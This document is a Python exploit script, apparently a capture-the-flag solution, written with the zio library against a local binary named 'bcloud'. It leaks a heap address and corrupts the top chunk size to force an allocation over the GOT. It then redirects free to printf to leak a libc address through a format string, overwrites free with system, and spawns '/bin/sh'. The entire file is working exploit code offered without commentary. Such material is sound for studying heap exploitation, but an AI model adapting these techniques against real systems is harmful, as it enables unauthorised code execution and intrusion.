from zio import *
import ctypes
io  = zio('./bcloud', print_read = False, print_write = False, timeout = 10000)
io.hint([0x8048be1])

# note_size 0x804b0a0 - 0x804b0c8
# name      0x804b0cc - 0x804b0d0
# org       0x804b0c8 - 0x804b0cc
# syn       0x804b0e0 - 0x804b108
# note      0x804b120 - 0x804b148
# host      0x804b148 - 0x804b14c

# leak heap
io.w('A' * 64) 
io.rtl('A' * 64)
heap_base = l32(io.r(4)) - 8
print '[+] heap base\t:\t{}'.format(hex(heap_base))

# rewrite the size of top chunk to 0xffffffff
io.w('B' * 64 + l32(0xffffffff) + 'C' * 60)

# malloc chunk at 0x804b0a0
got_free    = 0x804b014
plt_printf  = 0x080484d0
io.wls_af('>>', [1, ctypes.c_int32(0x100000000 + got_free - heap_base - 0x60).value, 'AAAA'])
io.wls_af('>>', [1, 0x100, l32(0x10)*0x20 + l32(got_free)])

# change free@got to printf
io.wls([3, 0, l32(plt_printf)])

# leak free
io.wls_af('>>', [1, 0x20, '0x%{}$08x'.format(19)])
io.wls_af('>>', [4, 2])
io.rtl('0x')
adr_libc_s_main_r = int(io.r(8), 16)
print '[+] __libc_start_main\t:\t{}'.format(hex(adr_libc_s_main_r))

off_libc_s_main_r   = 0x19a83
off_system          = 0x00040190
adr_system          = adr_libc_s_main_r - off_libc_s_main_r + off_system
print '[+] system\t:\t{}'.format(hex(adr_system))

io.wls_af('>>', [3, 0, l32(adr_system)])
io.wls_af('>>', [1, 8, '/bin/sh\x00'])
io.wls_af('>>', [4, 2])
io.itr()
